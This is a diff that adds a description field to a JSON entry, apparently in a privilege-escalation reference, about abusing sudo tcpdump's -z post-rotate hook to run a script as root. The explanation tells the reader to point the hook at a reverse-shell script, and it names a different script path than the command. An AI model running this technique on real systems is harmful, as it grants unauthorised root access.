@@ -213,7 +213,8 @@
   "variations": [
     {
       "label": "Run a command via -z postrotate",
-      "command": "sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/root.sh -Z root"
+      "command": "sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/root.sh -Z root",
+      "description": "Run a command via -z postrotate. See the command syntax for exact parameters and flags."
     }
   ],
   "explain": "Abuses tcpdump's post-rotate command hook to run a script as root:\n  sudo tcpdump -ln -i eth0   capture on the interface\n  -w /dev/null -W 1 -G 1   rotate the capture file every 1 second, keeping 1 file\n  -z /tmp/.test            run this script on each rotated file (executed as root)\n  -Z root                  drop privileges to root (so -z runs as root)\nPoint -z at a reverse-shell script and catch the root shell on your listener."
